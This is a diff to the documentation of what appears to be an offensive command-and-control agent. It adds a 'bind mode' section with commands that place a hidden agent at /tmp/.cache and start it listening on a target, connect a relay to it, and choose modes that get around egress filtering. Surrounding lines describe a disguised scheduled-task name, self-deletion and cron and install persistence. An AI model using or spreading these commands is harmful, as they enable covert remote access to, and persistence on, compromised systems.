@@ -62,6 +62,41 @@ Flags for Windows:
 - `--task-name SystemHealthCheck`: task name shown in Task Scheduler
 - `--self-delete`: delayed deletion via `cmd /c ping & del`
 
+## Bind mode (egress-filtered targets)
+
+When the target blocks outbound connections, use bind mode. The agent listens on a port
+and the relay connects to it. Requires inbound access to the target (VPN, pivot, port forward).
+
+```bash
+# Upload and start agent in bind mode
+pk shell exec <session> "chmod +x /tmp/.cache && /tmp/.cache --bind -p 8443 --tls &"
+
+# From the relay: connect to the bind agent
+gleipnir connect <TARGET_IP> 8443 --tls
+
+# Or via HTTP API
+curl -X POST http://localhost:6666/api/connect \
+  -H 'Content-Type: application/json' \
+  -d '{"host":"<TARGET_IP>","port":8443,"tls":true}'
+```
+
+Bind mode flags:
+- `--bind`: listen instead of connecting out
+- `--bind-addr <addr>`: listen address (default: 0.0.0.0)
+- `-p <port>`: listen port
+- `--tls`: agent generates a self-signed cert automatically
+
+Bind mode accepts one connection at a time. When the session ends, the agent returns
+to listening. Persistence flags (`--cron`, `--install`) work in bind mode too.
+
+Choose the right mode based on network conditions:
+
+| Scenario | Mode | Why |
+|----------|------|-----|
+| Target can reach your IP | Reverse connect (`-H`) | Standard, works behind NAT |
+| Target blocks outbound | Bind (`--bind`) | Agent listens, relay connects in |
+| Only HTTP/S out allowed | HTTP beacon (future) | Tunnels through allowed traffic |
+
 ## Verify connection
 
 ```bash
